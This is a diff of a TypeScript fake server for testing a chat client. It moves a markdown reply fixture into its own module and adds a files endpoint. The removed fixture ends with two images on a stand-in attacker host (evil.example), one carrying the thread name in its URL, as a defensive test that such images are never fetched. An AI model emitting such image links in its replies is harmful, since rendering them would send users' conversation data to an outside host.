@@ -58,6 +58,7 @@ import {
 import { SIGN_IN, discovered } from './fake-signin';
 import { PLANNED, PLANNING, PLANNING_HISTORY, type Planned } from './fake-plan';
 import { RESEARCH, RESEARCH_HISTORY, sourcesOf } from './fake-sources';
+import { MARKDOWN_PROMPT, MARKDOWN_REPLY } from './fake-markdown';
 
 /**
  * What the fake server knows: a project and the person's own project with their threads, one
@@ -477,41 +478,6 @@ function turn(message: { id: number; params: Record<string, unknown> }): string 
   return notes.map((note) => `data: ${JSON.stringify(note)}\n\n`).join('');
 }
 
-/** What the person asks for a reply in markdown (`streamReply`). */
-export const MARKDOWN_PROMPT = 'What changed?';
-
-/**
- * A reply in markdown as a model writes it: a heading, a table, a task list, code, a link, and
- * two images that must never be fetched, one written in markdown and one in raw HTML.
- */
-export const MARKDOWN_REPLY = [
-  '## The parser is fixed',
-  '',
-  '`parse()` returned a value for **empty input** and unwrapped a failed parse; it now returns ' +
-    '`None` for both. See [the issue](https://github.com/glave-ai/glave/issues/226).',
-  '',
-  '| Input | Before | After |',
-  '| :---- | :----: | ----: |',
-  '| `""` | panic | `None` |',
-  '| `"12"` | `12` | `Some(12)` |',
-  '',
-  '- [x] Return `None` for empty input',
-  '- [ ] Document the change',
-  '',
-  '```rust',
-  'fn parse(input: &str) -> Option<Value> {',
-  '    if input.is_empty() {',
-  '        return None;',
-  '    }',
-  '    input.parse().ok()',
-  '}',
-  '```',
-  '',
-  '![Coverage by file](https://evil.example/chart.png?thread=make-the-tests-pass)',
-  '',
-  '<img src="https://evil.example/pixel.png">',
-].join('\n');
-
 /** `text` in the pieces a model streams it in, a few characters each. */
 function piecesOf(text: string): readonly string[] {
   return text.match(/[\s\S]{1,6}/gu) ?? [];
@@ -639,6 +605,8 @@ const ANSWERS: Answers<Known> = {
   // Each of these threads is short: its latest turns are all of it.
   'thread/turns': (params) => ({ events: HISTORIES[params.thread] ?? [] }),
   'thread/changes': (params) => ({ changes: changesOf(HISTORIES[params.thread] ?? []) }),
+  // None of these threads' turns made a file for the person.
+  'thread/files': () => ({ made: [] }),
   'thread/steps': (params) => ({ steps: stepsOf(HISTORIES[params.thread] ?? []) }),
   'thread/start': (params, { started }) => {
     const inProject = params.project === PERSONAL.id ? PERSONAL : PROJECT;
